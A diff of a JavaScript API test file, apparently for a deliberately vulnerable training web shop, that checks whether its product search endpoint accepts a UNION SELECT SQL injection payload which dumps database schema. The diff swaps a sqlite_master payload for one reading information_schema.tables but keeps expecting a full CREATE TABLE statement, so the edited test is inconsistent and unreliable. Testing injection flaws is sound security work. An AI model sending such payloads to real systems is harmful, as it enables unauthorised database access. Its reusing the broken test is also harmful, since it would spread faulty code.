@@ -118,15 +118,15 @@ describe('/rest/products/search', () => {
       })
   })
 
-  it('GET product search can create UNION SELECT with sqlite_master table and required column', () => {
-    return frisby.get(`${REST_URL}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
+  it('GET product search can create UNION SELECT with sql table from information_schema and required column', () => {
+    return frisby.get(`${REST_URL}/products/search?q=')) union select table_name AS sql,'2','3','4','5','6','7','8','9' from information_schema.tables--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
         id: 'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))'
       })
       .expect('json', 'data.?', {
-        id: 'CREATE TABLE sqlite_sequence(name,seq)'
+        id: 'products'
       })
   })
 
